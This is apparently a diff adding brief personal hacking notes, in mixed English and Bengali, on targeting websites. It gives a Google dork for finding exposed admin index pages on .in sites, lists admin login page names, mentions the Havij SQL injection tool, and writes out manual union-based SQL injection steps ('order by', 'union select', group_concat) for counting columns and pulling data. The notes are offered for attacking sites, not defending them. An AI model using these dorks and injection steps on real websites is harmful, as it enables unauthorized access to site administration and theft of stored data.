@@ -1,0 +1,27 @@
+google dork :
+-------------
+-------------
+
+=>intitle:"index" of "admin" site:.in
+administration.aspx
+adminlogin.php
+
+=>inurl:------ site:.--
+
+weakness of websites :
+----------------------
+----------------------
+1.sql injection
+
+havij :
+--------
+--------
+----for sql injection :
+
+firefox hack :
+----------------
+-----------------
+----for sql injection :
+order by 2--  (number of column ber kore)   
+union select 1,2-- (column er vulnabolity ber kore)
+group_concat (information retrive korar jonno)
